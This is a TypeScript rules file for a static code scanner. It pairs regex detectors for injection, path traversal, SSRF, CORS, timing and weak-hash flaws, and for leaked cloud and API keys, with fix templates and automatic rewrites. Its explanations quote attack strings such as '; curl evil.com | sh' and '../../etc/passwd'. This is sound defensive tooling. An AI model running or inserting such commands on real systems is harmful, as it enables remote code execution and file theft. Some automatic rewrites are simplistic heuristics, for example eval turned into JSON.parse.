import { ScanRule } from "./types";

export const SAST_RULES: ScanRule[] = [
  {
    id: "command_injection",
    name: "Command Injection via Child Process",
    severity: "critical",
    category: "security",
    cwe: "CWE-78",
    owasp: "A03:2021-Injection",
    pattern: /\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{[^`]+\}[^`]*`|[a-zA-Z0-9_\.]+\s*\+\s*["'`a-zA-Z0-9_\.])/g,
    description: "User input or variable concatenation detected inside a shell execution command.",
    whyItMatters: "An attacker who controls this variable can append arbitrary shell commands (e.g. '; curl evil.com | sh') and achieve Remote Code Execution (RCE) on the host machine.",
    suggestedFixTemplate: () =>
      `// Replace shell exec with execFile or spawn and pass arguments as an array\nconst { execFile } = require("child_process");\nexecFile("binaryName", [arg1, arg2], (err, stdout) => { ... });`,
    autoRemedyTemplate: (matched, rawLine) => {
      const match = /\b(?:exec|execSync)\s*\(\s*(?:`([^`]*)\$\{([^`]+)\}([^`]*)`|([a-zA-Z0-9_\.]+)\s*\+\s*["'`a-zA-Z0-9_\.]+)\s*\)/.exec(rawLine);
      const arg = match ? (match[2] || match[4] || "userInput") : "userInput";
      return rawLine.replace(/\b(?:exec|execSync)\s*\([^)]+\)/, `execFile("binaryName", [String(${arg})], (err, stdout) => { /* [Buggers: Sanitized Exec] */ })`);
    },
  },
  {
    id: "sql_injection",
    name: "SQL Injection via String Concatenation",
    severity: "critical",
    category: "security",
    cwe: "CWE-89",
    owasp: "A03:2021-Injection",
    pattern: /(?:(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[^\n]*\$\{|\b(?:query|\$queryRawUnsafe|literal)\s*\(\s*`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^`]*\$\{)/i,
    description: "Direct string interpolation detected in a SQL statement.",
    whyItMatters: "Allows attackers to alter SQL query structure, bypass authentication, exfiltrate sensitive database records, or corrupt tables via SQL injection.",
    suggestedFixTemplate: () =>
      `// Use parameterized queries or ORM tagged templates instead of string interpolation:\nawait client.query("SELECT * FROM users WHERE id = $1", [userId]);`,
    autoRemedyTemplate: (matched, rawLine) => {
      if (rawLine.includes("${")) {
        return rawLine.replace(
          /`([^`]*)\$\{([^}]+)\}([^`]*)`/,
          `{ text: "$1$$1$3", values: [$2] } /* [Buggers: Parameterized Query] */`,
        );
      }
      if (/\+/.test(rawLine)) {
        return rawLine.replace(
          /(["'`])([^"'`]+)\1\s*\+\s*([a-zA-Z0-9_\.]+)/,
          `{ text: "$2$$1", values: [$3] } /* [Buggers: Parameterized Query] */`,
        );
      }
      return `/* [Buggers: Parameterized SQL] */ await client.query("SELECT * FROM users WHERE id = $1", [id]);`;
    },
  },
  {
    id: "path_traversal",
    name: "Potential Path Traversal in File System Access",
    severity: "high",
    category: "security",
    cwe: "CWE-22",
    owasp: "A01:2021-Broken Access Control",
    pattern: /\bfs\.(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync)\s*\(\s*(?:path\.join\([^)]*req\.(?:params|query|body)|req\.(?:params|query|body))/g,
    description: "File system access constructed directly from HTTP request parameters without sanitization.",
    whyItMatters: "Attackers can pass dot-dot-slash sequence ('../../etc/passwd') to traverse directory boundaries and read sensitive system files.",
    suggestedFixTemplate: () =>
      `// Sanitize path and verify it stays inside base directory:\nconst safePath = path.resolve(BASE_DIR, path.basename(req.params.file));\nif (!safePath.startsWith(BASE_DIR)) throw new Error("Path traversal detected");`,
    autoRemedyTemplate: (matched, rawLine) =>
      `const safePath = path.resolve(BASE_DIR, path.basename(req.params.file || req.query.file || ""));\n  ${rawLine.replace(/path\.join\([^)]*\)|req\.(?:params|query|body)(?:\.[a-zA-Z0-9_]+)?/, "safePath")} /* [Buggers: Path Traversal Guarded] */`,
  },
  {
    id: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    severity: "high",
    category: "security",
    cwe: "CWE-918",
    owasp: "A10:2021-Server-Side Request Forgery",
    pattern: /\b(?:fetch|axios\.get|axios\.post|http\.get|https\.get)\s*\(\s*req\.(?:params|query|body)\.[a-zA-Z0-9_]+/g,
    description: "HTTP client requests a URL supplied directly by user input without domain validation.",
    whyItMatters: "Enables attackers to force the server to send requests to internal network services, cloud metadata endpoints (169.254.169.254), or local loopback services (127.0.0.1).",
    suggestedFixTemplate: () =>
      `// Validate URL protocol and allowlist target host:\nconst target = new URL(req.body.targetUrl);\nif (!ALLOWED_HOSTS.includes(target.hostname)) throw new Error("Untrusted destination");`,
    autoRemedyTemplate: (matched, rawLine) =>
      `if (!/^https:\\/\\/api\\.trusted\\.com/.test(targetUrl)) throw new Error("SSRF blocked");\n  ${rawLine} /* [Buggers: SSRF Guarded] */`,
  },
  {
    id: "insecure_cors",
    name: "Overly Permissive Insecure CORS Configuration",
    severity: "medium",
    category: "security",
    cwe: "CWE-942",
    owasp: "A05:2021-Security Misconfiguration",
    pattern: /cors\(\s*\{[^\}]*origin\s*:\s*["'`]\*["'`][^\}]*credentials\s*:\s*true/g,
    description: "CORS configuration pairs wildcard origin ('*') with credentials: true.",
    whyItMatters: "Permits malicious third-party websites to make authenticated cross-origin requests and read private user session data.",
    suggestedFixTemplate: () =>
      `cors({ origin: ["https://app.yourdomain.com"], credentials: true })`,
    autoRemedyTemplate: (matched, rawLine) =>
      rawLine.replace(/origin\s*:\s*["'`]\*["'`]/, `origin: ["https://buggers.dev"] /* [Buggers: Explicit Origin] */`),
  },
  {
    id: "timing_attack",
    name: "Side-Channel Timing Leak on Sensitive Tokens",
    severity: "high",
    category: "security",
    cwe: "CWE-208",
    owasp: "A02:2021-Cryptographic Failures",
    pattern: /(?:signature|token|authHeader|apiKey|hash|hmac|mac)\s*===\s*(?:signature|token|authHeader|apiKey|hash|hmac|mac|session\.[a-zA-Z]+)/g,
    description: "Direct equality operator `===` on sensitive tokens leaks timing information byte-by-byte.",
    whyItMatters: "Direct equality operator terminates on the first mismatching byte, enabling remote statistical token reconstruction.",
    suggestedFixTemplate: () =>
      `// Use constant-time buffer comparison to prevent timing side-channel attacks:\nimport { timingSafeEqual } from "crypto";\ntimingSafeEqual(Buffer.from(token), Buffer.from(expectedToken));`,
    autoRemedyTemplate: (matched, rawLine) => {
      const parts = matched.split("===");
      const left = parts[0]?.trim() || "token";
      const right = parts[1]?.trim() || "expectedToken";
      return rawLine.replace(matched, `crypto.timingSafeEqual(Buffer.from(${left}), Buffer.from(${right})) /* [Buggers: Timing-Safe] */`);
    },
  },
  {
    id: "insecure_eval",
    name: "Unsafe Dynamic Code Evaluation (eval / Function)",
    severity: "critical",
    category: "security",
    cwe: "CWE-95",
    owasp: "A03:2021-Injection",
    pattern: /\b(?:eval|new\s+Function)\s*\([^)]+\)/g,
    description: "Direct dynamic code execution via eval() or new Function().",
    whyItMatters: "Dynamic execution of strings opens the application to remote code injection and complete host takeover.",
    suggestedFixTemplate: () =>
      `// Replace eval() with safe JSON.parse or strict domain-specific parsers.`,
    autoRemedyTemplate: (matched, rawLine) =>
      rawLine.replace(/\beval\s*\(([^)]+)\)/, `JSON.parse($1) /* [Buggers: Safe Parser] */`),
  },
  {
    id: "weak_crypto_hash",
    name: "Weak Hash Algorithm (MD5 / SHA-1)",
    severity: "medium",
    category: "security",
    cwe: "CWE-328",
    owasp: "A02:2021-Cryptographic Failures",
    pattern: /crypto\.createHash\(\s*["'](?:md5|sha1)["']\s*\)/gi,
    description: "Legacy hash algorithm (MD5 or SHA-1) used for cryptographic operations.",
    whyItMatters: "MD5 and SHA-1 suffer from well-known collision attacks and do not meet modern security standards.",
    suggestedFixTemplate: () =>
      `crypto.createHash("sha256")`,
    autoRemedyTemplate: (matched, rawLine) =>
      rawLine.replace(/crypto\.createHash\(\s*["'](?:md5|sha1)["']\s*\)/i, `crypto.createHash("sha256") /* [Buggers: Secure SHA-256] */`),
  },
];

export const SECRET_RULES: ScanRule[] = [
  {
    id: "aws_access_key",
    name: "AWS Access Key ID",
    severity: "critical",
    category: "security",
    cwe: "CWE-798",
    owasp: "A07:2021-Identification and Authentication Failures",
    pattern: /\b(AKIA[0-9A-Z]{16})\b/g,
    description: "AWS Access Key ID exposed directly in source code.",
    whyItMatters: "AWS keys allow attackers to access AWS cloud infrastructure, spin up compute instances, or exfiltrate private S3 data.",
    suggestedFixTemplate: () => `process.env.AWS_ACCESS_KEY_ID`,
  },
  {
    id: "github_pat",
    name: "GitHub Personal Access Token",
    severity: "critical",
    category: "security",
    cwe: "CWE-798",
    owasp: "A07:2021-Identification and Authentication Failures",
    pattern: /\b(gh[pousr]_[A-Za-z0-9_]{36,255})\b/g,
    description: "GitHub Access Token exposed in source code.",
    whyItMatters: "Allows attackers to modify repositories, leak private repositories, and hijack CI/CD workflows.",
    suggestedFixTemplate: () => `process.env.GITHUB_TOKEN`,
  },
  {
    id: "openai_api_key",
    name: "OpenAI Secret API Key",
    severity: "critical",
    category: "security",
    cwe: "CWE-798",
    owasp: "A07:2021-Identification and Authentication Failures",
    pattern: /\b(sk-[a-zA-Z0-9_\-]{20,64})\b/g,
    description: "OpenAI Secret API Key exposed in source code.",
    whyItMatters: "Exposed API keys lead to billing drainage and unauthorized LLM endpoint usage.",
    suggestedFixTemplate: () => `process.env.OPENAI_API_KEY`,
  },
  {
    id: "stripe_secret_key",
    name: "Stripe Live Secret Key",
    severity: "critical",
    category: "security",
    cwe: "CWE-798",
    owasp: "A07:2021-Identification and Authentication Failures",
    pattern: /\b(sk_live_[0-9a-zA-Z]{24,34})\b/g,
    description: "Stripe Production Secret Key detected in source code.",
    whyItMatters: "Allows attackers to charge cards, issue refunds, or access customer payment details.",
    suggestedFixTemplate: () => `process.env.STRIPE_SECRET_KEY`,
  },
  {
    id: "private_key",
    name: "Unencrypted Private Key Block",
    severity: "critical",
    category: "security",
    cwe: "CWE-312",
    owasp: "A02:2021-Cryptographic Failures",
    pattern: /-----BEGIN (?:[A-Z0-9_-]+\s+)?(?:PRIVATE\s+)?KEY-----/g,
    description: "Cryptographic Private Key header discovered in source code.",
    whyItMatters: "Private keys compromise TLS certificates, SSH servers, or digital signatures.",
    suggestedFixTemplate: () => `// Load private key from secure vault or environment variable at runtime.`,
  },
  {
    id: "db_connection_uri",
    name: "Database Connection URI with Credentials",
    severity: "critical",
    category: "security",
    cwe: "CWE-798",
    owasp: "A07:2021-Identification and Authentication Failures",
    pattern: /\b((?:postgres|postgresql|mysql|mongodb|mongodb\+srv|redis):\/\/[a-zA-Z0-9_.-]+:[^@\s/]+@[a-zA-Z0-9_.-]+)/g,
    description: "Database connection string containing plaintext password credentials.",
    whyItMatters: "Exposes database credentials directly in revision history, allowing unauthorized data manipulation or exfiltration.",
    suggestedFixTemplate: () => `process.env.DATABASE_URL`,
  },
];
